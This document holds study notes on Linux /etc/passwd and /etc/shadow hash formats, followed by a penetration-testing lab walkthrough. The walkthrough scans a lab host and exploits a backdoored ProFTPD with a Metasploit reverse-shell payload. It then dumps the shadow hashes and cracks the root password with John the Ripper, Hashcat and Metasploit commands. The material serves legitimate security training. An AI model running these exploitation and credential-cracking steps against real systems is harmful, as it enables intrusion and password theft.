### 🔐 Linux Password Hashes Overview

- **Multi-user systems** like Linux support simultaneous logins. While beneficial, this increases the **attack surface**, as each user account is a potential entry point.
    

---

### 📁 Key Files:

#### `/etc/passwd`

- Contains user account details (username, UID, GID, home directory, shell, etc.).
    
- Readable by all users.
    
- Example entry:
    
    ```
    ashu:x:1001:1001:Ashu:/home/ashu:/bin/bash
    ```
    
    - The `x` means the **password hash is stored in `/etc/shadow`**.
        

#### `/etc/shadow`

- Stores actual **hashed passwords**.
    
- Only readable by **root** for security.
    
- Example entry:
    
    ```
    ashu:$6$randomsalt$hashedvalue:19234:0:99999:7:::
    ```

### 🔍 Hash Identification (Based on Prefix):

|Prefix|Hashing Algorithm|
|---|---|
|`$1$`|**MD5**|
|`$2$`|**Blowfish**|
|`$5$`|**SHA-256**|
|`$6$`|**SHA-512**|

> 📌 **Note**: Most modern Linux systems use **SHA-512** (`$6$`) by default due to its better cryptographic strength.

---

### 🔐 Security Implications:

- Having access to `/etc/shadow` allows an attacker to **offline brute-force** password hashes (e.g., using John the Ripper or Hashcat).
    
- Always enforce:
    
    - Strong password policies.
        
    - File permissions (`chmod 640 /etc/shadow`).
        
    - Regular user/account audits.

### 🔧 Bonus: Hash Cracking Basics

If you gain access to `/etc/shadow`, you can extract hashes and use tools like:

```bash
john /etc/shadow --wordlist=rockyou.txt
```

Or:

```bash
hashcat -m 1800 shadow.hashes rockyou.txt
```

# Lab

## Overview

Auxiliary modules in the Metasploit Framework are versatile components used to perform a wide range of tasks that do not necessarily involve exploiting a vulnerability. These tasks can include scanning, enumeration, fuzzing, cracking hashes, and other network-related activities. Auxiliary modules are an essential part of the penetration testing process as they help gather information, identify potential targets, and assess the security posture of systems and networks.

## Lab Environment

In this lab environment, you will be provided with GUI access to a Kali machine. The target machine running a vulnerable application will be accessible at **demo.ine.local**.

**Objective:** Run the following auxiliary module against the target:

- auxiliary/analyze/crack_linux

## Tools

The best tools for this lab are:

- Nmap
- Metasploit Framework

## Solutions

**Step 1:** Open the lab link to access the Kali machine.

**Step 2:** Check if the target machine is reachable:

**Command:**

```
ping -c 4 demo.ine.local
```

The target is reachable.

**Step 3:** Run an nmap scan against the target:

**Command:**

```
nmap -sS -sV demo.ine.local
```

**Step 4:** We have discovered a proftpd 1.3.3c server running on the target machine. We will run nmap vuln script to identify the vulnerability.

**Command:**

```
nmap --script vuln -p 21 demo.ine.local
```

The target proftpd installation has been running a backdoored version.

**Step 5:** We will start the postgresql database server on the attacker machine. We are starting postgresql to store all metasploit loot and other sensitive information from the target machine.

**Command:**

```
/etc/init.d/postgresql start
```

**Step 6:** We have started postgresql database server. Start metasploit framework and exploit proftpd server using exploit/unix/ftp/proftpd_133c_backdoor module.

Make sure to replace LHOST with the IP address of the attacker machine.

**Commands:**

```
msfconsole -q
use exploit/unix/ftp/proftpd_133c_backdoor
set payload payload/cmd/unix/reverse
set RHOSTS demo.ine.local
set LHOST 192.70.114.2
exploit -z
```

**Step 7:** We have exploited the target ftp server. We will use a post exploitation module to dump the system users hashes.

**Commands:**

```
use post/linux/gather/hashdump
set SESSION 1
exploit
```

**Step 8:** Run the provided auxiliary module to find the plain text password of the root user.

**Command:**

```
use auxiliary/analyze/crack_linux
set SHA512 true
run
```

This reveals the flag to us.

**Flag:** password

## Conclusion

In this lab, we exploited a vulnerable application, peformed a hash dump and cracked the hash as well, all using metasploit modules.
